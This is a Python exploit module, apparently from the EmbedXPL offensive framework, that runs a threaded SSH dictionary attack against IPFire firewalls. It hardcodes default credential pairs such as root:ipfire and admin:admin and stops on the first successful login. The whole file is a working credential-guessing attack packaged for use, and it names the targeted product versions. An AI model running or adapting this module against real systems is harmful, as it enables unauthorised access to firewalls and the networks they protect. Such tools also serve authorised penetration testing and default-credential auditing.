# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    """IPFire Firewall Default SSH Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "IPFire Default SSH Credentials",
        "description": (
            "Dictionary attack with default credentials against IPFire SSH service. "
            "IPFire is a Linux-based open-source firewall popular in SMB environments. "
            "Default root password is set during installation wizard — often left as default. "
            "Cherry-picked from FirewallXPL-Forge."
        ),
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": (
            "IPFire 2.x (all versions)",
            "IPFire appliances and self-hosted installations",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(22, "Target SSH port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(
        "root:ipfire,root:admin,root:password,root:123456,admin:admin",
        "User:Pass pairs",
    )
    stop_on_success = OptBool(True, "Stop on first valid authentication")
    verbosity = OptBool(True, "Display authentication attempts")
